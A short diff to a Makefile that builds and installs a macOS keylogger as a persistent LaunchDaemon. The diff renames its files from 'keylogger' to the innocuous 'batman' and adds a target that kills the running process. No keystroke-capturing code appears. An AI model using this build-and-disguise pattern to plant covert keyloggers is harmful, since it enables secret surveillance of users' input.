@@ -1,10 +1,11 @@
 EXECUTABLE=batman
-PLIST=keylogger.plist
+PLIST=batman.plist
 INSTALLDIR=/usr/local/bin
 PLISTFULL=/Library/LaunchDaemons/$(PLIST)
 
-all: keylogger.c
-	gcc keylogger.c utils.c -framework ApplicationServices -framework Carbon -o $(EXECUTABLE)
+all: batman.c
+	rm ./$(EXECUTABLE)
+	gcc batman.c utils.c -framework ApplicationServices -framework Carbon -o $(EXECUTABLE)
 
 install: all
 	mkdir -p $(INSTALLDIR)
@@ -27,3 +28,7 @@ unload:
 
 clean:
 	rm $(EXECUTABLE)
+
+kill:
+	killall $(EXECUTABLE)
+	kill -9 $(shell ps aux | grep $(EXECUTABLE) | grep -v grep | awk '{print $$2}')
